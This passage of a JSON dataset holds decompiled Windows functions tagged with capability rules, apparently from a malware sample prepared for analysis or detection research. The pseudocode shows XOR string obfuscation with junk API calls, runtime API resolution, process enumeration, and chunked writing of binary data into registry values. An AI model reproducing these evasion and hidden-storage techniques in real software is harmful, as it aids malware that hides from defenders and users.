0x742d5606;\n                psz2 = 0x59266e35;\n                var_8h = 0x566e4107;\n                var_2ch = 0x7459566e;\n                var_28h._0_1_ = 0x41;\n                fcn.00401000(0x18);\n                iVar5 = var_1ch;\n                iVar8 = 0;\n                iVar6 = &pProxyInfo - var_1ch;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_DestroyCaret)();\n                    iVar3 = pszSrch;\n                    if (iVar4 != 0x1a3fb4) {\n                        *(iVar8 + iVar5) = *(&var_2ch + iVar8 % var_14h) ^ (iVar8 + iVar5)[iVar6];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0xc);\n                iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, pszSrch);\n                var_14h = 0;\n                do {\n                    pszSrch = fcn.004038af(&var_14h);\n                    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    if (pszSrch == 0) {\n                        uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n                        uVar7 = (*pcVar1)(0, iVar3);\n                        (*pcVar2)(uVar7);\n                        goto code_r0x00409948;\n                    }\n                    iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszSrch, iVar5);\n                } while (((iVar6 == lpcwszUrl) != (iVar8 == pszSrch)) ||\n                        (iVar8 = (*_sym.imp.ntdll.dll_wcschr)(pszSrch, 0x3d),  iVar8 == 0));\n                (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar8 + 2);\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n                uVar7 = (*pcVar2)(0, iVar3);\n                (*pcVar1)(uVar7);\n                goto code_r0x004099a3;\n            }\n            do {\n                iVar5 = fcn.004038af(&var_14h);\n                if (iVar5 == 0) goto code_r0x004097f3;\n                iVar5 = (*_sym.imp.SHLWAPI.dll_PathMatchSpecW)(&pszFile, iVar5);\n            } while (iVar5 == 0);\n        }\n    }\ncode_r0x00409948:\n    uVar7 = 0;\ncode_r0x0040994a:\n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalFree;\n    if (var_38h != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(var_38h);\n    }\n    if (var_34h != 0) {\n        (*pcVar1)(var_34h);\n    }\n    if (var_30h != 0) {\n        (*pcVar1)(var_30h);\n    }\n    return uVar7;\n}\n",
        "token_count": 2257
    },
    "00409aca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00409aca(int32_t param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_18h = param_1;\n    if (*0x41cdb4 == NULL) {\n        var_30h = 0x571b0413;\n        var_2ch._0_2_ = 0x6c12;\n        var_2ch._2_1_ = 0x43;\n        stack0xffffffd3 = 0x390a4a1c;\n        var_28h._3_1_ = 0x12;\n        var_24h._0_1_ = 0x3f;\n        var_24h._1_1_ = 0x4b;\n        var_24h._2_1_ = 0x65;\n        var_14h = 0x384c775a;\n        var_10h._0_1_ = 0x65;\n        fcn.00401000(0xf);\n        iVar5 = var_ch;\n        iVar7 = 0;\n        var_8h = 5;\n        iVar6 = &var_30h - var_ch;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetFocus)();\n            if (iVar3 != 0x9c1a9c) {\n                *(iVar7 + iVar5) = *(&var_14h + iVar7 % var_8h) ^ (iVar7 + iVar5)[iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xf);\n        var_30h = 0x291d533c;\n        var_2ch._0_2_ = 0x3b07;\n        var_2ch._2_1_ = 5;\n        stack0xffffffd3 = 0x3b06695d;\n        var_28h._3_1_ = 0x5a;\n        var_24h._0_1_ = 0x6f;\n        var_20h = 0x476f3657;\n        var_1ch._0_1_ = 0x62;\n        fcn.00401000(0xd);\n        iVar5 = var_14h;\n        iVar7 = 0;\n        iVar6 = &var_30h - var_14h;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            if (iVar3 != 0x46b089) {\n                *(iVar7 + iVar5) = *(&var_20h + iVar7 % var_8h) ^ (iVar7 + iVar5)[iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5, var_ch);\n        *0x41cdb4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        uVar4 = (*pcVar2)(0, var_ch);\n        (*pcVar1)(uVar4);\n        if (*0x41cdb4 == NULL) {\n            return var_4h;\n        }\n    }\n    if ((var_18h != 0) && (iVar5 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, var_18h),  iVar5 != 0)) {\n        iVar6 = (**0x41cdb4)(iVar5, &var_4h);\n        var_4h = var_4h & -(iVar6 != 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar5);\n    }\n    return var_4h;\n}\n",
        "token_count": 1036
    },
    "00409ffb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00409ffb(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    _var_28h = 0;\n    var_18h = in_EDX;\n    var_4h = in_ECX;\n    if (in_ECX == -1) {\n        var_10h = 1;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        var_4h = fcn.00409faf();\n    }\n    if (*0x41cddc == NULL) {\n        var_34h = 0x1b280202;\n        var_30h = 0x2012421e;\n        var_2ch._0_2_ = 0x721b;\n        var_20h = 0x774c766c;\n        var_1ch._0_1_ = 0x72;\n        fcn.00401000(10);\n        iVar6 = lpModuleName;\n        var_14h = &var_34h - lpModuleName;\n        var_8h = 5;\n        iVar5 = 0;\n        do {\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar3 != 0x50efc5) {\n                *(iVar5 + iVar6) = *(&var_20h + iVar5 % var_8h) ^ (iVar5 + iVar6)[var_14h];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 10);\n        var_50h = 0x1f1b3f31;\n        var_4ch = 0x1e7c5d07;\n        var_48h = 0x1e0f1115;\n        var_44h = 0x1e040225;\n        var_40h = 0x153d2029;\n        var_3ch = 0x93e2706;\n        var_38h._0_2_ = 0x5f46;\n        var_38h._2_1_ = 0x48;\n        var_20h = 0x704c486b;\n        var_1ch._0_1_ = 0x70;\n        fcn.00401000(0x1b);\n        iVar6 = var_14h;\n        var_14h = &var_50h - var_14h;\n        iVar5 = 0;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_DestroyCaret)();\n            if (iVar3 != 0x6383c6) {\n                *(iVar5 + iVar6) = *(&var_20h + iVar5 % var_8h) ^ (iVar5 + iVar6)[var_14h];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x1b);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar6);\n        *0x41cddc = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        uVar4 = (*pcVar2)(0, lpModuleName);\n        (*pcVar1)(uVar4);\n        var_28h = 0;\n        iVar6 = var_4h;\n        in_EDX = var_18h;\n        if (*0x41cddc == NULL) goto code_r0x0040a186;\n    }\n    iVar6 = var_4h;\n    var_28h = 0;\n    iVar5 = (**0x41cddc)(var_4h, *in_EDX, in_EDX[1], arg_8h, arg_ch, 0, &var_28h);\n    if (-1 < iVar5) {\n    }\ncode_r0x0040a186:\n    if (var_10h != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar6);\n    }\n    return var_28h;\n}\n",
        "token_count": 1159
    },
    "0040a19c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040a19c(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    uchar *puVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    int32_t *in_EDX;\n    code *pcVar10;\n    int32_t *piVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    uchar *puVar14;\n    uint var_a8h;\n    uint var_a0h;\n    int32_t var_74h;\n    int32_t var_70h;\n    int32_t *var_6ch;\n    uint32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uint32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uchar *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    ushort var_28h;\n    uint var_26h;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_16h;\n    uint var_11h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_60h = 0;\n    var_5ch = 0;\n    var_4ch = 0;\n    var_48h = 0x1b280202;\n    var_44h = 0x2012421e;\n    var_40h._0_2_ = 0x721b;\n    var_8h = 0x774c766c;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x72);\n    var_6ch = in_EDX;\n    fcn.00401000(10);\n    iVar8 = var_54h;\n    iVar12 = 0;\n    iVar13 = &var_48h - var_54h;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar5 != 0x50efc5) {\n            var_ch = 5;\n            *(iVar12 + iVar8) = *(&var_8h + iVar12 % 5) ^ (iVar12 + iVar8)[iVar13];\n        }\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 10);\n    var_30h = 0x2b32320b;\n    var_2ch._0_1_ = 0x1d;\n    var_2ch._1_1_ = 1;\n    var_2ch._2_2_ = 0x1465;\n    var_28h = 0x2110;\n    var_26h._0_2_ = 0x4e18;\n    var_26h._2_2_ = 0x2b18;\n    var_22h._0_2_ = 0x2b03;\n    var_22h._2_2_ = 0x5a18;\n    var_1eh._0_2_ = 0x3130;\n    var_1eh._2_2_ = 0x2b0c;\n    var_1ah._0_2_ = 0x6704;\n    var_1ah._2_2_ = 0x2a23;\n    var_34h = 0x6;\n    var_16h._0_1_ = 6;\n    stack0xffffffe7 = 0x67441921;\n    var_11h._0_2_ = 0x6571;\n    var_8h = 0x44654551;\n    var_4h._0_2_ = 0x376a;\n    fcn.00401000(0x21);\n    iVar8 = var_64h;\n    iVar12 = 0;\n    iVar13 = &var_30h - var_64h;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar5 = var_54h;\n        if (iVar6 != 0x3d47dc) {\n            *(iVar12 + iVar8) = *(&var_8h + iVar12 % var_34h) ^ (iVar12 + iVar8)[iVar13];\n        }\n        pcVar10 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0x21);\n    if ((*0x41d214 & 1) == 0) {\n        *0x41d214 = *0x41d214 | 1;\n        *0x41d218 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_54h);\n    }\n    if ((*0x41d214 & 2) == 0) {\n        *0x41d214 = *0x41d214 | 2;\n        *0x41d21c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41d218, iVar8);\n    }\n    if (*0x41d218 == 0) {\n        *0x41d218 = (*pcVar10)(iVar5);\n    }\n    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41d21c == NULL) {\n        var_30h = 0x2b32320b;\n        var_2ch._0_1_ = 0x1d;\n        var_2ch._1_1_ = 1;\n        var_2ch._2_2_ = 0x1465;\n        var_28h = 0x2110;\n        var_26h._0_2_ = 0x4e18;\n        var_26h._2_2_ = 0x2b18;\n        var_22h._0_2_ = 0x2b03;\n        var_22h._2_2_ = 0x5a18;\n        var_1eh._0_2_ = 0x3130;\n        var_1eh._2_2_ = 0x2b0c;\n        var_1ah._0_2_ = 0x6704;\n        var_1ah._2_2_ = 0x2a23;\n        var_16h._0_1_ = 6;\n        stack0xffffffe7 = 0x67441921;\n        var_11h._0_2_ = 0x6571;\n        var_8h = 0x44654551;\n        var_4h._0_2_ = 0x376a;\n        fcn.00401000(0x21);\n        iVar8 = var_ch;\n        iVar13 = 0;\n        var_ch = &var_30h - var_ch;\n        do {\n            iVar12 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar12 != 0x3d47dc) {\n                *(iVar13 + iVar8) = *(&var_8h + iVar13 % var_34h) ^ (iVar13 + iVar8)[var_ch];\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 0x21);\n        *0x41d21c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41d218, iVar8);\n        uVar7 = (*pcVar10)(0, iVar8);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n        iVar5 = var_54h;\n        iVar8 = var_64h;\n    }\n    fcn.00409aca();\n    if ((*0x41d21c != NULL) && (iVar13 = (**0x41d21c)(var_50h, 0, &var_a8h, 0x30, &var_58h),  -1 < iVar13)) {\n        uVar7 = (*pcVar10)(0, 0x200);\n        var_34h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n        if (var_34h != NULL) {\n            uVar7 = (*pcVar10)(0, 0x100);\n            iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n            if (((iVar13 != 0) && (var_58h = fcn.00409ffb(iVar13, 0x28),  var_58h != 0)) &&\n               (var_58h = fcn.00409ffb(iVar13 + 0x28, 0x40),  var_58h != 0)) {\n                var_44h = *(iVar13 + 0x3c);\n                var_ch = *(iVar13 + 0x18) + 0x10;\n                var_8h = *(iVar13 + 0x1c) + (0xffffffef < *(iVar13 + 0x18));\n                piVar11 = var_6ch + 2;\n                var_48h = *(iVar13 + 0x38);\n                var_4ch = 4;\n                if ((var_48h != var_ch) || (*(iVar13 + 0x3c) != var_8h)) {\n                    do {\n                        var_58h = fcn.00409ffb(iVar13 + 0x68, 0x98);\n                        puVar3 = var_34h;\n                        iVar5 = var_54h;\n                        iVar8 = var_64h;\n                        if (var_58h == 0) break;\n                        var_74h = *(iVar13 + 0x68);\n                        var_70h = *(iVar13 + 0x6c);\n                        var_4ch = var_4ch + 0x120;\n                        var_48h = var_74h;\n                        var_44h = var_70h;\n                        if (var_4ch <= arg_8h) {\n                            uVar1 = *(iVar13 + 0xb0);\n                            *(piVar11 + 6) = var_5ch;\n                            piVar11[5] = *(iVar13 + 0xd0);\n                            *(piVar11 + 7) = *(iVar13 + 0xd4);\n                            piVar11[4] = *(iVar13 + 0xa8);\n                            piVar11[2] = *(iVar13 + 0x98);\n                            var_68h = uVar1 >> 1;\n                            piVar11[3] = *(iVar13 + 0x9c);\n                            puVar14 = var_34h;\n                            for (iVar8 = 0x200; iVar8 != 0; iVar8 = iVar8 + -1) {\n                                *puVar14 = 0;\n                                puVar14 = puVar14 + 1;\n                            }\n                            if ((var_68h < 0x100) && (var_58h = fcn.00409ffb(var_34h, *(iVar13 + 0xb0)),  var_58h != 0))\n                            {\n                                uVar9 = 0;\n                                if (var_68h != 0) {\n                                    do {\n                                        *(uVar9 + 0x20 + piVar11) = puVar3[uVar9 * 2];\n                                        uVar9 = uVar9 + 1;\n                                    } while (uVar9 < var_68h);\n                                }\n                                *(var_68h + 0x20 + piVar11) = 0;\n                                iVar4 = (*_sym.imp.ntdll.dll_strrchr)(piVar11 + 8, 0x5c);\n                                *(piVar11 + 0x1e) = iVar4 + (-0x1f - piVar11);\n                            }\n                            piVar11 = piVar11 + 0x48;\n                            var_5ch = var_5ch + 1;\n                        }\n                    } while ((var_74h != var_ch) || (iVar5 = var_54h,  iVar8 = var_64h,  var_70h != var_8h));\n                }\n                if (var_6ch != NULL) {\n                    *var_6ch = var_5ch;\n                }\n            }\n            uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_34h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar13 != 0) {\n                uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar13);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n            }\n        }\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = var_4ch;\n    }\n    if ((var_4ch <= arg_8h) && (var_4ch != 0)) {\n        var_60h = 1;\n    }\n    uVar7 = (*pcVar10)(0, iVar8);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    uVar7 = (*pcVar10)(0, iVar5);\n    (*pcVar2)(uVar7);\n    return var_60h;\n}\n",
        "token_count": 3055
    },
    "0040a9f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a9f0(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    int32_t in_EDX;\n    uint uVar6;\n    uint32_t *puVar7;\n    uint var_10h;\n    uint lpString2;\n    uint32_t lpString1;\n    uint32_t var_4h;\n    \n    fcn.00409aca();\n    fcn.0040a19c(0, &var_4h);\n    lpString1 = var_4h;\n    puVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n    if (puVar2 != NULL) {\n        do {\n            iVar3 = fcn.0040a19c(lpString1, &var_4h);\n            uVar1 = var_4h;\n            if ((iVar3 != 0) || (var_4h <= lpString1)) break;\n            lpString1 = var_4h;\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar2, 0, 0x8000);\n            puVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uVar1, 0x3000, 4);\n        } while (puVar2 != NULL);\n        uVar6 = 2;\n        if ((puVar2 != NULL) && (uVar1 <= lpString1)) {\n            var_4h = 0;\n            puVar7 = puVar2 + 2;\n            if (*puVar2 != 0) {\n                do {\n                    iVar3 = *(puVar7 + 0x1e) + 0x20 + puVar7;\n                    if ((in_EDX == 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(iVar3, in_EDX),  iVar4 == 0)) {\ncode_r0x0040aafd:\n                        uVar6 = 0;\n                        *arg_8h = puVar7[2];\n                        arg_8h[1] = puVar7[3];\n                        if (arg_ch != NULL) {\n                            *arg_ch = puVar7[4];\n                        }\n                        break;\n                    }\n                    puVar5 = (*_sym.imp.ntdll.dll_strchr)(iVar3, 0x2e);\n                    if (puVar5 != NULL) {\n                        *puVar5 = 0;\n                        iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(iVar3, in_EDX);\n                        if (iVar3 == 0) goto code_r0x0040aafd;\n                    }\n                    puVar7 = puVar7 + 0x48;\n                    var_4h = var_4h + 1;\n                } while (var_4h < *puVar2);\n            }\n            goto code_r0x0040ab1e;\n        }\n    }\n    uVar6 = 8;\ncode_r0x0040ab1e:\n    if (puVar2 != NULL) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar2, 0, 0x8000);\n    }\n    return uVar6;\n}\n",
        "token_count": 750
    },
    "0040b1cd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040b1cd(int32_t *param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t unaff_EBX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint ARG_0;\n    uint lpValueName;\n    int32_t *var_60h;\n    uint32_t var_5ch;\n    int32_t var_58h;\n    uint32_t var_54h;\n    int32_t hKey;\n    int32_t var_4ch;\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar7 = unaff_EBX & 0xffffff00;\n    var_60h = param_1;\n    var_48h = uVar7;\n    var_ch = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    uVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if ((((uVar3 != 0) && (param_1 != NULL)) && (*param_1 != 0)) && (param_1[1] != 0)) {\n        var_5ch = uVar3;\n        fcn.0040b055();\n        hKey = fcn.0040b000(0x20006);\n        if (hKey != 0) {\n            var_4ch = *param_1;\n            var_44h = 0x6d5a5233;\n            var_40h = 0x33335128;\n            var_3ch = 0x5228461f;\n            var_38h = 0x512b6d7a;\n            var_34h = 0x460a3333;\n            var_30h = 0x6d165234;\n            var_54h = (((var_4ch + 0x7cfffU) / 0x7d000) * 0x7d000) / 0x7d000;\n            puVar9 = &ARG_0;\n            for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_2ch = 0x33525122;\n            puVar9 = &lpValueName;\n            for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_24h = 0x6d335251;\n            var_20h._0_1_ = 0x46;\n            fcn.00401000(0x38);\n            iVar6 = var_58h;\n            iVar8 = 0;\n            var_28h = &var_44h - var_58h;\n            do {\n                iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessorNumber)();\n                if (iVar4 != 0xe9bebf) {\n                    var_1ch = 5;\n                    puVar1 = iVar8 + iVar6;\n                    *puVar1 = *(&var_24h + iVar8 % 5) ^ puVar1[var_28h];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar6, var_ch);\n            var_18h = 0x701a331c;\n            var_ch = 0;\n            var_14h = 0x331c6f69;\n            var_10h = 0x6f36700d;\n            var_8h = 0x70693339;\n            var_4h._0_2_ = 0x6f36;\n            var_28h = 6;\n            do {\n                fcn.00401000(0x18);\n                iVar6 = var_1ch;\n                iVar4 = 0;\n                iVar8 = &var_18h - var_1ch;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                    if (iVar5 != 0x1fa405) {\n                        *(iVar4 + iVar6) = *(&var_8h + iVar4 % var_28h) ^ (iVar4 + iVar6)[iVar8];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 0xc);\n                puVar9 = &lpValueName;\n                for (iVar8 = 0x40; iVar4 = var_ch,  iVar8 != 0; iVar8 = iVar8 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar6, &ARG_0, var_ch);\n                (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(hKey, &lpValueName);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                var_ch = iVar4 + 1;\n            } while (var_ch < 0x32);\n            var_1ch = 0;\n            uVar7 = var_48h;\n            if (0 < var_54h) {\n                var_ch = 0;\n                var_18h = 0x701a331c;\n                var_14h = 0x331c6f69;\n                var_10h = 0x6f36700d;\n                var_8h = 0x70693339;\n                var_4h._0_2_ = 0x6f36;\n                do {\n                    fcn.00401000(0x18);\n                    uVar3 = var_48h;\n                    iVar8 = 0;\n                    iVar6 = &var_18h - var_48h;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                        if (iVar4 != 0x1fa405) {\n                            *(iVar8 + uVar3) = *(&var_8h + iVar8 % var_28h) ^ (iVar8 + uVar3)[iVar6];\n                        }\n                        iVar8 = iVar8 + 1;\n                    } while (iVar8 < 0xc);\n                    puVar9 = &lpValueName;\n                    for (iVar6 = 0x40; iVar8 = var_1ch,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar9 = 0;\n                        puVar9 = puVar9 + 1;\n                    }\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, uVar3, &ARG_0, var_1ch);\n                    iVar6 = 0x7d000;\n                    if (var_4ch < 0x7d000) {\n                        iVar6 = var_4ch;\n                    }\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)\n                                      (hKey, &lpValueName, 0, 3, var_60h[1] + var_ch, iVar6);\n                    uVar7 = 1 - (iVar6 != 0);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar3);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    var_1ch = iVar8 + 1;\n                    var_ch = var_ch + 0x7d000;\n                    var_4ch = var_4ch + -0x7d000;\n                } while (var_1ch < var_54h);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_58h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar3 = var_5ch;\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    return uVar3 & 0xffffff00 | uVar7 & 0xff;\n}\n",
        "token_count": 2061
    },
    "0040b4fa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
